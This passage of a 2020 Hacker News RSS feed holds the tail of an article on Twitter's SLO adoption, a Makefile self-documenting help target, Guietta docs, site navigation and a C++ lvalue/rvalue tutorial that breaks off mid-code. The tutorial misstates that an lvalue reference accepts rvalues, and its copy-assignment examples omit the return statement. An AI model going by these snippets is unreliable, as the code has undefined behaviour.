faulty datapoint to reason around what the true user success rate is.<br></p><p>Once the team sets a reasonable SLO at the top level, that will drive down through the services that a boundary depends on. Every service has a multitude of service dependencies, and thus the latency and success SLOs for all upstream and downstream services must all work together in context of the defined boundary. SLOs enable a more holistic way of measuring the whole call path.&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 	</p><h3>A major turning point: tying SLOs to error budgets</h3><p>The introduction of error budgets marked another critical inflection point in Twitter’s adoption of SLOs. Error budgets make SLOs actionable and provide a different lens to understand a service over time, so they were an important follow-on feature after the original delivery of SLOs.&nbsp;<br></p><p>Error budgets look at the SLO over time, and thus have allowed the team to begin tracking performance by providing a historical view into how the service met objectives through different timeframes. The traditional metric view tends to be shortsighted, and can bury signals around valuable trends and opportunities. Instead of a dashboard that charts hundreds of metrics, error budgets become a forcing function to pick a few of the most important metrics, and get deeper into how and why they change over time.&nbsp;<br></p><p>An important note is that the team does not prescribe a fixed set of actions upon the exhaustion of the error budget. While error budgets can be a powerful tool, the true value has to resonate with engineering and product teams.&nbsp;<br></p><p>With the notion of “<a href="https://www.linkedin.com/pulse/netflixs-context-control-how-does-work-steve-urban/">context, not control</a>” (coined by Netflix), there is strong emphasis on empowering well-intentioned, capable teammates with visualizations and insights to allow them to make better decisions. In the same way, Twitter SREs apply ongoing experimentation to understand what other team members will view as valuable to measure. They understand that error budgets are more about giving team members good tools and context; there is no one policy fits all.&nbsp;&nbsp;<br></p><p>For example, one team hypothesized that the error budget would help inform when automated deploys could proceed, and specifically, whether to pause a deploy if the error budget was exhausted.&nbsp; But what they found was that sometimes the deploy being paused or blocked could contain the fix for the increased errors. Thus, that simple rule of “block deploys if no error budget remains” quickly began to fall apart. The very deploy getting blocked could decrease the volume or rate of errors, and possibly even defend the SLO and enable it to be met over its remaining duration of time.&nbsp;<br></p><p>Bearing in mind that they aren’t necessarily meant to be prescriptive, error budgets provide very useful suggestions for service owners in thinking about how to prioritize work. They create an important ‘runway’ for scaling the pace of innovation up or down. For example, overly rapid error budget burndown could be a sign to prioritize mitigation work for the current on-call or an upcoming sprint. Alternatively, not using enough of the error budget could nudge the team to iterate on feature work faster, or experiment more.&nbsp;</p><h3>The benefits of SLO</h3><p>While the team is still early in its adoption of SLOs, they’ve already seen the immense potential and value of SLOs in several ways.&nbsp;<br></p><p><strong><em>From a ‘distributed service zoo’ to a shared language</em></strong></p><p>Twitter has hundreds, if not thousands, of services, making its infrastructure a complex beast to understand. The current members of the Twitter Command Center (TCC) have been around long enough where they generally know what most of the services are and how services ‘snap together’. However, they know that eventually they will reach a point where that becomes impossible, where no one individual can grok how it all works. By investing in SLOs now to help guide discussions, the goal is that by the time they reach that point of un-knowable complexity, they will have set themselves up to manage service metrics programmatically.<br></p><p><strong><em>The right amount of context</em></strong></p><p>Context is the key. Dashboards can easily have hundreds of charts which translate into thousands of metrics. Teams might have tens or hundreds of alerts on their services across multiple data centers. These dashboards, metrics, and alerts are helpful for those running those services, but they're very high context, and information overload for anyone else.&nbsp;<br></p><p>SLOs create the ability to have more directed conversations with shared context. Instead of looking at a hundred pictures of a dashboard, the team can align on the four or five things that matter. lf any of those are not green, others can understand that something's not right without having to know anything else about the service.<br></p><p><strong><em>Dynamic load balancing and load shedding</em></strong></p><p>By making SLOs a first class entity, services can speak it at the programming level, beyond just measuring it. This enables the team to make systematic improvements using SLOs as a building block. For example, the team is exploring whether back pressure in Finagle can instead be SLO-based.<br></p><p>With Finagle, services can programmatically detect when they are under load (typically with second class signals such as CPU), and then signal to redirect traffic to another instance. Instead of relying on second class signals to implement back pressure, a service can directly know if it’s trending towards an SLO violation in order to signal back pressure and reduce load on itself.<br></p><p><strong><em>Graceful degradation</em></strong></p><p>One of the Twitter team’s goals for SLO is in gracefully degrading services during large-scale events to ensure that core functionality is always available. Rather than an all-or-nothing failure mode, the team aims to gracefully degrade services by stripping away peripheral features while maintaining core functionality.<br></p><p>The Twitter team is interested in utilizing SLOs to implement a selective circuit breaker pattern to …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.blameless.com/blog/slo-adoption-twitter">https://www.blameless.com/blog/slo-adoption-twitter</a></em></p>]]>
            </description>
            <link>https://www.blameless.com/blog/slo-adoption-twitter</link>
            <guid isPermaLink="false">hacker-news-small-sites-23702876</guid>
            <pubDate>Wed, 01 Jul 2020 15:55:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to list all the targets on a Makefile]]>
            </title>
            <description>
<![CDATA[
Score 129 | Comments 54 (<a href="https://news.ycombinator.com/item?id=23702756">thread link</a>) | @diamantidis_io
<br/>
July 1, 2020 | https://diamantidis.github.io/tips/2020/07/01/list-makefile-targets | <a href="https://web.archive.org/web/*/https://diamantidis.github.io/tips/2020/07/01/list-makefile-targets">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p><code>make</code> is great tool to orchestrate the setup and build process of a project. It expects a <code>Makefile</code>, where we define targets to execute, like for example <code>install</code> and <code>run</code>. Then we can use <code>make install</code> and <code>make run</code> to execute those tasks.</p> <p>While target names like <code>install</code> are quite common, the problems arise when we have to deal with a lengthy <code>Makefile</code>, and we are not aware of all the available targets.</p> <p>Hopefully, with a slight modification of our current <code>Makefile</code> and the addition of a new target, we can expose this information and access it from the Terminal app. Let’s see how!</p> <p>First, we will have to document each of the existing targets. To do so, we will add a comment starting with <code>##</code> right after the target’s name.</p> <div><div><pre><code><span>install</span>: <span>## Install </span>
	@echo <span>"Installing..."</span>

run: <span>## Run</span>
	@echo <span>"Running..."</span>
</code></pre></div></div> <p>Then, we will use the <code>grep</code> and <code>sed</code> command to get the name of the target and the documentation, like in the following snippet:</p> <div><div><pre><code>.DEFAULT_GOAL :<span>=</span> <span>help</span>
.PHONY: <span>help

help</span>:
	@grep <span>-E</span> <span>'^[a-zA-Z0-9_-]+:.*?## .*$$'</span> <span>$(</span>MAKEFILE_LIST<span>)</span> <span>\</span>
	| <span>sed</span> <span>-n</span> <span>'s/^\(.*\): \(.*\)##\(.*\)/\1\3/p'</span> <span>\</span>
	| column <span>-t</span>  <span>-s</span> <span>' '</span>
</code></pre></div></div> <p>We will also set the <code>.PHONY</code> and the <code>.DEFAULT_GOAL</code> variables. The last one will make <code>help</code> the default target when running <code>make</code> without a specific target.</p> <p>Now, if we head back to the Terminal app, and run <code>make</code>, we will get the list of the documented targets as an output <img title=":rocket:" alt=":rocket:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f680.png" height="20" width="20"></p>
<pre><code>install  Install
run      Run
</code></pre>
</div></div>]]>
            </description>
            <link>https://diamantidis.github.io/tips/2020/07/01/list-makefile-targets</link>
            <guid isPermaLink="false">hacker-news-small-sites-23702756</guid>
            <pubDate>Wed, 01 Jul 2020 15:46:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Guietta, a new module to quickly assemble Python GUIs]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=23702723">thread link</a>) | @alfiopuglisi
<br/>
July 1, 2020 | https://guietta.readthedocs.io/en/latest/ | <a href="https://web.archive.org/web/*/https://guietta.readthedocs.io/en/latest/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <div>
          <div role="main">
            
  <div id="guietta">

<p>Guietta is a tool that makes simple GUIs <em>simple</em>:</p>
<div><div><pre><span></span><span>from</span> <span>guietta</span> <span>import</span> <span>_</span><span>,</span> <span>Gui</span><span>,</span> <span>Quit</span>

<span>gui</span> <span>=</span> <span>Gui</span><span>(</span>

  <span>[</span>  <span>'Enter numbers:'</span><span>,</span> <span>'__a__'</span>  <span>,</span> <span>'+'</span> <span>,</span> <span>'__b__'</span><span>,</span>  <span>[</span><span>'Calculate'</span><span>]</span> <span>],</span>
  <span>[</span>  <span>'Result:  --&gt;'</span>  <span>,</span> <span>'result'</span> <span>,</span>  <span>_</span>  <span>,</span>    <span>_</span>   <span>,</span>       <span>_</span>        <span>],</span>
  <span>[</span>  <span>_</span>               <span>,</span>    <span>_</span>     <span>,</span>  <span>_</span>  <span>,</span>    <span>_</span>   <span>,</span>      <span>Quit</span>      <span>]</span>
<span>)</span>

<span>with</span> <span>gui</span><span>.</span><span>Calculate</span><span>:</span>
    <span>gui</span><span>.</span><span>result</span> <span>=</span> <span>float</span><span>(</span><span>gui</span><span>.</span><span>a</span><span>)</span> <span>+</span> <span>float</span><span>(</span><span>gui</span><span>.</span><span>b</span><span>)</span>

<span>gui</span><span>.</span><span>run</span><span>()</span>
</pre></div>
</div>
<p>And here it is:</p>
<p><img alt="_images/example.png" src="https://guietta.readthedocs.io/en/latest/_images/example.png">
</p></div>


<div id="troubleshooting">

<p>Guietta uses Qt5, and some Linux distributions, like Ubuntu 16.04, appear
to have an incomplete default installation. If you encounter trouble
running guietta, please read the
<a href="https://guietta.readthedocs.io/en/latest/troubleshooting.html">troubleshooting guide</a>.</p>
<p>If you use conda, please read our page on
<a href="https://guietta.readthedocs.io/en/latest/qt_conda.html">QT incompatibilities with conda</a>.</p>
</div>



          </div>
        </div>
      </div>
      
      
    </div></div>]]>
            </description>
            <link>https://guietta.readthedocs.io/en/latest/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23702723</guid>
            <pubDate>Wed, 01 Jul 2020 15:43:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: My Mistakes and Learnings building 2 Startups (Newsletter)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23702680">thread link</a>) | @hrishikesh1990
<br/>
July 1, 2020 | https://2.flexiple.com/entrepreneur-musings | <a href="https://web.archive.org/web/*/https://2.flexiple.com/entrepreneur-musings">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-collapse="medium" data-animation="default" data-duration="400" role="banner"><div><div><div><div><p><a href="https://2.flexiple.com/"><img src="https://uploads-ssl.webflow.com/5e5365d233730913f7f9ed7e/5e5f3aad7dbd992dba175bca_Flexiple%20favicon.png" width="50" srcset="https://uploads-ssl.webflow.com/5e5365d233730913f7f9ed7e/5e5f3aad7dbd992dba175bca_Flexiple%20favicon-p-500.png 500w, https://uploads-ssl.webflow.com/5e5365d233730913f7f9ed7e/5e5f3aad7dbd992dba175bca_Flexiple%20favicon-p-800.png 800w, https://uploads-ssl.webflow.com/5e5365d233730913f7f9ed7e/5e5f3aad7dbd992dba175bca_Flexiple%20favicon.png 1170w" sizes="(max-width: 991px) 100vw, 50px" alt=""></a></p><div><h4>Innovate</h4><div><p>Made with ❤️ &nbsp;by <a href="https://flexiple.com/" target="_blank">Flexiple</a></p></div></div></div><nav role="navigation"><div data-hover="1" data-delay="150"><div><a href="https://2.flexiple.com/founder-origin-stories/all-founders"><p>Origin Stories</p></a></div><nav><div><div><div><div role="list"><div role="listitem"><a href="https://2.flexiple.com/founders/chris-barton"><div><p>Chris Barton</p><p>Since the technology to identify music directly from the device was not available at the time, Barton thought of building the technology himself.</p></div></a></div><div role="listitem"><a href="https://2.flexiple.com/founders/jonah-peretti"><div><p>Jonah Peretti</p><p>Jonah Perretti had become somewhat of an expert in making stuff go viral on the internet. He decided to create Buzzfeed to capitalise on that skill.</p></div></a></div><div role="listitem"><a href="https://2.flexiple.com/founders/yoshikazu-tanaka"><div><p>Yoshikazu Tanaka</p><p>At the age of 26, when a majority of the youth are figuring out what to do with their lives, Tanaka had started developing GREE.</p></div></a></div></div></div></div><div><a href="https://2.flexiple.com/founder-origin-stories/all-founders"><p>Explore in Detail</p></a></div></div></nav></div><div data-hover="1" data-delay="150"><div><a href="https://2.flexiple.com/entrepreneur-musings" aria-current="page"><p>Newsletter</p></a></div><nav><div><div><div><div role="list"><div role="listitem"><a href="https://2.flexiple.com/newsletter/the-good-bad-and-the-ugly-of-metric-tracking"><div><p>How I realised that tracking metrics is a double-edged sword 🖖🏻</p><p>I recently read a top marketeer write on LinkedIn: "Only a few core metrics matter. Others are a distraction". Well, I don't agree. All metrics matter but in the right context. Today, I share my experiences, where based on the context, metric tracking was either good, bad or ugly.</p></div></a></div><div role="listitem"><a href="https://2.flexiple.com/newsletter/journey-of-building-a-community-part2"><div><p>Learning from a failed community to build Remote Clan 🏋🏼</p><p>So we were able to find something that interested remote workers - high-quality remote work content. Subscribers were increasing. So we started our first community on Slack for remote product makers, which failed. We tried to build a community the second time - The Remote Clan.</p></div></a></div><div role="listitem"><a href="https://2.flexiple.com/newsletter/journey-of-building-a-community-part1"><div><p>Step-by-step story of how we built The Remote Clan 👨‍🔧</p><p>Remote Clan is now an Open Startup. But it didn't start yesterday. It is a journey of about a couple of years. Today, I share the details of that journey. The ups-downs, failed experiments and mini-successes, and the decision-making while we traversed it all.</p></div></a></div></div></div></div><div><a href="https://2.flexiple.com/entrepreneur-musings" aria-current="page"><p>Explore in Detail</p></a></div></div></nav></div><a href="https://2.flexiple.com/scale/home" target="_blank">Scale</a></nav></div><div><p><a href="https://flexiple.com/" target="_blank">Try Flexiple</a></p></div></div></div></div><div data-collapse="medium" data-animation="default" data-duration="400" data-easing="ease-out" data-easing2="ease-out" role="banner"><div><p><a href="https://2.flexiple.com/"><img src="https://uploads-ssl.webflow.com/5e5365d233730913f7f9ed7e/5e5f3aad7dbd992dba175bca_Flexiple%20favicon.png" width="50" srcset="https://uploads-ssl.webflow.com/5e5365d233730913f7f9ed7e/5e5f3aad7dbd992dba175bca_Flexiple%20favicon-p-500.png 500w, https://uploads-ssl.webflow.com/5e5365d233730913f7f9ed7e/5e5f3aad7dbd992dba175bca_Flexiple%20favicon-p-800.png 800w, https://uploads-ssl.webflow.com/5e5365d233730913f7f9ed7e/5e5f3aad7dbd992dba175bca_Flexiple%20favicon.png 1170w" sizes="(max-width: 991px) 50px, 100vw" alt=""></a></p><nav role="navigation"><a href="https://2.flexiple.com/">Home</a><div data-delay="0"><div><a href="https://2.flexiple.com/founder-origin-stories/all-founders"><p>Origin Stories</p></a></div><nav><div><div role="list"><div role="listitem"><a href="https://2.flexiple.com/founders/travis-kalanick"><div><p>Travis Kalanick</p><p>Travis Kalanick was a self-made millionaire when he sold his first company. The thirst for entrepreneurship stuck with him, and he went on to build a tech empire.</p></div></a></div><div role="listitem"><a href="https://2.flexiple.com/founders/reid-hoffman"><div><p>Reid Hoffman</p><p>Despite being a Silicon Valley legend, Hoffman had to go to great lengths to create LinkedIn in the aftermath of the dot com crash.</p></div></a></div><div role="listitem"><a href="https://2.flexiple.com/founders/kathryn-petralia"><div><p>Kathryn Petralia</p><p>Wanting to make lending more easy, there is a slight irony in the story of Kabbage, where they had to explore less-conventional means to get seed money.</p></div></a></div></div></div><div><a href="https://2.flexiple.com/founder-origin-stories/all-founders"><p>Explore in Detail</p></a></div></nav></div><div data-delay="0"><div><a href="https://2.flexiple.com/entrepreneur-musings" aria-current="page"><p>Newsletter</p></a></div><nav><div><div role="list"><div role="listitem"><a href="https://2.flexiple.com/newsletter/the-good-bad-and-the-ugly-of-metric-tracking"><div><p>How I realised that tracking metrics is a double-edged sword 🖖🏻</p><p>I recently read a top marketeer write on LinkedIn: "Only a few core metrics matter. Others are a distraction". Well, I don't agree. All metrics matter but in the right context. Today, I share my experiences, where based on the context, metric tracking was either good, bad or ugly.</p></div></a></div><div role="listitem"><a href="https://2.flexiple.com/newsletter/journey-of-building-a-community-part2"><div><p>Learning from a failed community to build Remote Clan 🏋🏼</p><p>So we were able to find something that interested remote workers - high-quality remote work content. Subscribers were increasing. So we started our first community on Slack for remote product makers, which failed. We tried to build a community the second time - The Remote Clan.</p></div></a></div><div role="listitem"><a href="https://2.flexiple.com/newsletter/journey-of-building-a-community-part1"><div><p>Step-by-step story of how we built The Remote Clan 👨‍🔧</p><p>Remote Clan is now an Open Startup. But it didn't start yesterday. It is a journey of about a couple of years. Today, I share the details of that journey. The ups-downs, failed experiments and mini-successes, and the decision-making while we traversed it all.</p></div></a></div></div></div><div><a href="https://2.flexiple.com/entrepreneur-musings" aria-current="page"><p>Explore in Detail</p></a></div></nav></div><a href="https://2.flexiple.com/scale/home" target="_blank">Scale</a></nav><div></div></div></div></div></div>]]>
            </description>
            <link>https://2.flexiple.com/entrepreneur-musings</link>
            <guid isPermaLink="false">hacker-news-small-sites-23702680</guid>
            <pubDate>Wed, 01 Jul 2020 15:40:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Covid-19 Treatment Dashboard]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=23702619">thread link</a>) | @greatwave1
<br/>
July 1, 2020 | https://www.quiverquant.com/sources/covidTreatment | <a href="https://web.archive.org/web/*/https://www.quiverquant.com/sources/covidTreatment">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.quiverquant.com/sources/covidTreatment</link>
            <guid isPermaLink="false">hacker-news-small-sites-23702619</guid>
            <pubDate>Wed, 01 Jul 2020 15:36:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lvalue vs Rvalue]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23702499">thread link</a>) | @keyboardman
<br/>
July 1, 2020 | https://leimao.github.io/blog/CPP-lvalue-rvalue-Reference/ | <a href="https://web.archive.org/web/*/https://leimao.github.io/blog/CPP-lvalue-rvalue-Reference/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <h3 id="introduction">Introduction</h3>

<p>The concepts of lvalue and rvalue in C++ had been confusing to me ever since I started to learn C++. I did not fully understand the purpose and motivation of having these two concepts during programming and had not been using rvalue reference in most of my projects. Given most of the documentation on the topic of lvalue and rvalue on the Internet are lengthy and lack of concrete examples, I feel there could be some developers who have been confused as well.</p>



<p>In this blog post, I would like to introduce the concepts of lvalue and rvalue, followed by the usage of rvalue reference and its application in move semantics in C++ programming.</p>

<h3 id="lvalue-vs-rvalue">lvalue VS rvalue</h3>

<p>In C++, each expression, such as an operator with its operands, literals, and variables, has type and value. We could categorize each expression by type or value. Each expression is either lvalue (expression) or rvalue (expression), if we categorize the expression by value. Note that when we say lvalue or rvalue, it refers to the expression rather than the actual value in the expression, which is confusing to some people. So personally I would rather call an expression lvalue expression or rvalue expression, without omitting the word “expression”.</p>



<p>lvalue expression is so-called because historically it could appear on the left-hand side of an assignment expression, while rvalue expression is so-called because it could only appear on the right-hand side of an assignment expression. lvalue expression is associated with a specific piece of memory, the lifetime of the associated memory is the lifetime of lvalue expression, and we could get the memory address of it. rvalue expression might or might not take memory. Even if an rvalue expression takes memory, the memory taken would be temporary and the program would not usually allow us to get the memory address of it.</p>

<h4 id="example">Example</h4>

<div><div><pre><code><span>#include &lt;iostream&gt;
</span>
<span>class</span> <span>Foo</span>
<span>{</span>
<span>public:</span>
    <span>Foo</span><span>()</span>
    <span>{</span>
    <span>}</span>
    <span>Foo</span><span>(</span><span>int</span> <span>x</span><span>)</span> <span>:</span> <span>mX</span><span>{</span><span>x</span><span>}</span>
    <span>{</span>
    <span>}</span>
    <span>int</span> <span>mX</span> <span>=</span> <span>0</span><span>;</span>
<span>};</span>

<span>void</span> <span>printFoo1</span><span>(</span><span>const</span> <span>Foo</span><span>&amp;</span> <span>foo</span><span>)</span>
<span>{</span>
    <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>foo</span><span>.</span><span>mX</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>endl</span><span>;</span>
<span>}</span>

<span>void</span> <span>printFoo2</span><span>(</span><span>const</span> <span>Foo</span> <span>foo</span><span>)</span>
<span>{</span>
    <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>foo</span><span>.</span><span>mX</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>endl</span><span>;</span>
<span>}</span>

<span>int</span> <span>main</span><span>()</span>
<span>{</span>
    <span>int</span> <span>x</span> <span>=</span> <span>1</span><span>;</span> <span>// rvalue expression as a whole, x is lvalue expression, 1 is rvalue expression and has no memory associations</span>
    <span>Foo</span> <span>foo1</span><span>{</span><span>10</span><span>};</span> <span>// rvalue expression as a whole, foo1 is lvalue expression</span>
    <span>Foo</span> <span>foo2</span><span>{</span><span>20</span><span>};</span> <span>// rvalue expression as a whole, foo2 is lvalue expression</span>
    <span>foo1</span> <span>=</span> <span>Foo</span><span>();</span> <span>// rvalue expression as a whole, foo1 is lvalue expression, Foo() is rvalue expression and takes temporary memory</span>
    <span>foo1</span> <span>=</span> <span>foo2</span><span>;</span> <span>// rvalue expression as a whole, foo1 is lvalue expression</span>
    <span>printFoo1</span><span>(</span><span>foo1</span><span>);</span> <span>// rvalue expression as a whole, printFoo1 is lvalue expression</span>
    <span>printFoo2</span><span>(</span><span>foo1</span><span>);</span> <span>// rvalue expression as a whole, printFoo2 is lvalue expression</span>
    <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>&amp;</span><span>printFoo1</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>endl</span><span>;</span> <span>// printFoo1 is lvalue expression and we could get the address of it</span>
<span>}</span>
</code></pre></div></div>

<h3 id="rvalue-reference">rvalue Reference</h3>

<p><code>T&amp;</code> is the operator for lvalue reference, and <code>T&amp;&amp;</code> is the operator for rvalue reference. Literally it means that lvalue reference accepts an lvalue expression and lvalue reference accepts an rvalue expression.</p>

<h4 id="example-1">Example</h4>

<div><div><pre><code><span>#include &lt;string&gt;
#include &lt;iostream&gt;
</span>
<span>int</span> <span>main</span><span>()</span>
<span>{</span>
    <span>std</span><span>::</span><span>string</span> <span>str1</span> <span>=</span> <span>"Hello"</span><span>;</span>
    <span>std</span><span>::</span><span>string</span> <span>str2</span> <span>=</span> <span>" Underworld"</span><span>;</span>
    <span>std</span><span>::</span><span>string</span> <span>str3</span> <span>=</span> <span>str1</span> <span>+</span> <span>str2</span><span>;</span>
    <span>std</span><span>::</span><span>string</span><span>&amp;</span> <span>str_lref</span> <span>=</span> <span>str3</span><span>;</span> <span>// Cannot do lvalue reference std::string&amp; str_lref = str1 + str2, because str1 + str2 is rvalue expression</span>
    <span>std</span><span>::</span><span>string</span><span>&amp;&amp;</span> <span>str_rref</span> <span>=</span> <span>str1</span> <span>+</span> <span>str2</span><span>;</span> <span>// rvalue reference</span>
    <span>std</span><span>::</span><span>string</span> <span>str_punc</span> <span>=</span> <span>"!"</span><span>;</span>
    <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>&amp;</span><span>str_lref</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>endl</span><span>;</span>
    <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>&amp;</span><span>str_rref</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>endl</span><span>;</span>
    <span>str_lref</span> <span>+=</span> <span>str_punc</span><span>;</span> <span>// str_lref is lvalue expression</span>
    <span>str_rref</span> <span>+=</span> <span>str_punc</span><span>;</span> <span>// str_rref is lvalue expression</span>
    <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>str_lref</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>endl</span><span>;</span>
    <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>str_rref</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>endl</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>In this particular example, at first glance, the rvalue reference seems to be useless. Why would we bother to use rvalue reference given lvalue could do the same thing. In the next section, we would see that rvalue reference is used for move semantics which could potentially increase the performance of the program under some circumstances. We would also see that only by rvalue reference we could distinguish move semantics from copy semantics.</p>

<h3 id="move-semantics">Move Semantics</h3>

<p>In C++, we could create a new variable from another variable, or assign the value from one variable to another variable. To keep both variables “alive”, we would use copy semantics, i.e., copy one variable to another. In some scenarios, after assigning the value from one variable to another variable, the variable that gave the value would be no longer useful, so we would use move semantics.</p>



<p>Because move semantics does fewer memory manipulations compared to copy semantics, it is faster than copy semantics in general. Let’s take a look at the following example.</p>

<h4 id="example-2">Example</h4>

<div><div><pre><code><span>/*
 * move.cpp
 */</span>
<span>#include &lt;string&gt;
#include &lt;iostream&gt;
#include &lt;vector&gt;
#include &lt;chrono&gt;
</span>
<span>class</span> <span>FooIncomplete</span>
<span>{</span>
<span>public:</span>
    <span>// Default constructor</span>
    <span>FooIncomplete</span><span>()</span>
    <span>{</span>
    <span>}</span>
    <span>// Non-default constructor</span>
    <span>FooIncomplete</span><span>(</span><span>size_t</span> <span>num</span><span>)</span> <span>:</span> <span>mNum</span><span>{</span><span>num</span><span>}</span>
    <span>{</span>
        <span>this</span><span>-&gt;</span><span>mArr</span> <span>=</span> <span>new</span> <span>int</span><span>[</span><span>this</span><span>-&gt;</span><span>mNum</span><span>];</span>
    <span>}</span>
    <span>~</span><span>FooIncomplete</span><span>()</span>
    <span>{</span>
        <span>delete</span><span>[]</span> <span>this</span><span>-&gt;</span><span>mArr</span><span>;</span>
    <span>}</span>
    <span>// Copy constructor</span>
    <span>// Copy constructor has access to private members</span>
    <span>FooIncomplete</span><span>(</span><span>const</span> <span>FooIncomplete</span><span>&amp;</span> <span>foo</span><span>)</span>
    <span>{</span>
        <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>"Copy constructor called!"</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>endl</span><span>;</span>
        <span>this</span><span>-&gt;</span><span>mArr</span> <span>=</span> <span>new</span> <span>int</span><span>[</span><span>foo</span><span>.</span><span>mNum</span><span>];</span>
        <span>std</span><span>::</span><span>copy</span><span>(</span><span>foo</span><span>.</span><span>mArr</span><span>,</span> <span>foo</span><span>.</span><span>mArr</span> <span>+</span> <span>foo</span><span>.</span><span>mNum</span><span>,</span> <span>this</span><span>-&gt;</span><span>mArr</span><span>);</span>
        <span>this</span><span>-&gt;</span><span>mNum</span> <span>=</span> <span>foo</span><span>.</span><span>mNum</span><span>;</span>
    <span>}</span>
    <span>// Copy assignment</span>
    <span>FooIncomplete</span><span>&amp;</span> <span>operator</span><span>=</span><span>(</span><span>const</span> <span>FooIncomplete</span><span>&amp;</span> <span>foo</span><span>)</span>
    <span>{</span>
        <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>"Copy assignment called!"</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>endl</span><span>;</span>
        <span>delete</span><span>[]</span> <span>this</span><span>-&gt;</span><span>mArr</span><span>;</span>
        <span>this</span><span>-&gt;</span><span>mArr</span> <span>=</span> <span>new</span> <span>int</span><span>[</span><span>foo</span><span>.</span><span>mNum</span><span>];</span>
        <span>std</span><span>::</span><span>copy</span><span>(</span><span>foo</span><span>.</span><span>mArr</span><span>,</span> <span>foo</span><span>.</span><span>mArr</span> <span>+</span> <span>foo</span><span>.</span><span>mNum</span><span>,</span> <span>this</span><span>-&gt;</span><span>mArr</span><span>);</span>
        <span>this</span><span>-&gt;</span><span>mNum</span> <span>=</span> <span>foo</span><span>.</span><span>mNum</span><span>;</span>
    <span>}</span>
<span>private:</span>
    <span>size_t</span> <span>mNum</span><span>{</span><span>0</span><span>};</span>
    <span>int</span><span>*</span> <span>mArr</span><span>{</span><span>nullptr</span><span>};</span>
<span>};</span>

<span>class</span> <span>Foo</span>
<span>{</span>
<span>public:</span>
    <span>// Default constructor</span>
    <span>Foo</span><span>()</span>
    <span>{</span>
    <span>}</span>
    <span>// Non-default constructor</span>
    <span>Foo</span><span>(</span><span>size_t</span> <span>num</span><span>)</span> <span>:</span> <span>mNum</span><span>{</span><span>num</span><span>}</span>
    <span>{</span>
        <span>this</span><span>-&gt;</span><span>mArr</span> <span>=</span> <span>new</span> <span>int</span><span>[</span><span>this</span><span>-&gt;</span><span>mNum</span><span>];</span>
    <span>}</span>
    <span>~</span><span>Foo</span><span>()</span>
    <span>{</span>
        <span>delete</span><span>[]</span> <span>this</span><span>-&gt;</span><span>mArr</span><span>;</span>
    <span>}</span>
    <span>// Copy constructor</span>
    <span>// Copy constructor has access to private members</span>
    <span>Foo</span><span>(</span><span>const</span> <span>Foo</span><span>&amp;</span> <span>foo</span><span>)</span>
    <span>{</span>
        <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>"Copy constructor called!"</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>endl</span><span>;</span>
        <span>this</span><span>-&gt;</span><span>mArr</span> <span>=</span> <span>new</span> <span>int</span><span>[</span><span>foo</span><span>.</span><span>mNum</span><span>];</span>
        <span>std</span><span>::</span><span>copy</span><span>(</span><span>foo</span><span>.</span><span>mArr</span><span>,</span> <span>foo</span><span>.</span><span>mArr</span> <span>+</span> <span>foo</span><span>.</span><span>mNum</span><span>,</span> <span>this</span><span>-&gt;</span><span>mArr</span><span>);</span>
        <span>this</span><span>-&gt;</span><span>mNum</span> <span>=</span> <span>foo</span><span>.</span><span>mNum</span><span>;</span>
    <span>}</span>
    <span>// Copy assignment</span>
    <span>Foo</span><span>&amp;</span> <span>operator</span><span>=</span><span>(</span><span>const</span> <span>Foo</span><span>&amp;</span> <span>foo</span><span>)</span>
    <span>{</span>
        <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>"Copy assignment called!"</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>endl</span><span>;</span>
        <span>delete</span><span>[]</span> <span>this</span><span>-&gt;</span><span>mArr</span><span>;</span>
        <span>this</span><span>-&gt;</span><span>mArr</span> <span>=</span> <span>new</span> <span>int</span><span>[</span><span>foo</span><span>.</span><span>mNum</span><span>];</span>
